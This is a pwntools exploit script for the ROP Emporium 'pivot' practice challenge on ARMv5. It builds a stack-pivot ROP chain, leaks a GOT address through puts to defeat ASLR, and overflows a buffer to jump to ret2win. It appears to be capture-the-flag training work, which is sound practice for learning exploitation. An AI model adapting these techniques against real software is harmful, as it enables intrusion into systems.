from pwn import *

p = process('./pivot_armv5-hf')

elf = ELF("./libpivot_armv5-hf.so")
mov_sp_r5_pop_r4_fp_pc = 0x00010934 #mov sp, r5 ; pop {r4, fp, pc}
pop_r4_pc = 0x10790 # pop {r4, pc}
sub_sp_fp_4 = 0x0001083c # sub sp, fp, #4 ; pop {fp, pc}
pop_all = 0x0001099c # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
pop_r3_pc = 0x00010604 # pop {r3, pc}
mov_r0_r3_sub_sp_fp_4 = 0x00010838 # mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}

foothold_function_plt = 0x0001067c
foothold_function_got = 0x2102c

main = 0x001079c
pwnme = 0x00010858

puts_plt = 0x00010640


print(p.recvuntil(b'place to pivot: '))
raw_data = p.recvline()[:-1]
pivot_addr = int(raw_data.decode() , 16 )
print(hex(pivot_addr))
print(p.recvuntil(b'> '))

buf = p32(pivot_addr + 4 * 14 + 4)  #fp
buf += p32(pop_all)
buf += p32(0xAAAA) #r1
buf += p32(0xAAAA) #r2 
buf += p32(0xAAAA) #r4
buf += p32(0xAAAA) #r5
buf += p32(0xAAAA) #r6
buf += p32(0xAAAA) #r7
buf += p32(0xAAAA) #r8
buf += p32(0xAAAA) #r12
buf += p32(pop_r3_pc) #r14(LR)
buf += p32(foothold_function_plt) # pc

buf += p32(foothold_function_got) # r3
buf += p32(mov_r0_r3_sub_sp_fp_4) # pc

buf += p32(pivot_addr + 4 * 28 + 4) # fp
buf += p32(pop_all) # pc

buf += p32(0xAAAA) #r1
buf += p32(0xAAAA) #r2 
buf += p32(0xAAAA) #r4
buf += p32(0xAAAA) #r5
buf += p32(0xAAAA) #r6
buf += p32(0xAAAA) #r7
buf += p32(0xAAAA) #r8
buf += p32(0xAAAA) #r12
buf += p32(pop_r3_pc) #r14(LR)
buf += p32(puts_plt) # pc

buf += p32(pivot_addr) # r3
buf += p32(mov_r0_r3_sub_sp_fp_4) # pc

buf += p32(0xAAAA) # fp
buf += p32(pwnme) # pc

p.send(buf)

print(p.recvuntil(b'> '))
buf = b'A' * 0x20
buf += p32(pivot_addr + 4) # fp(r11)
buf += p32(sub_sp_fp_4)
p.send(buf)

print(p.recvuntil(b'foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n'))
foothold_function_addr = p.recv(4)
foothold_function_addr = u32(foothold_function_addr)
ret2win = foothold_function_addr - elf.symbols['foothold_function'] + elf.symbols['ret2win']
print(hex(ret2win))

print(p.recvuntil(b'> '))
p.send(b'AAAA')
print(p.recvuntil(b'> '))
buf = b'A' * 0x24
buf += p32(ret2win)
p.send(buf)

p.interactive()
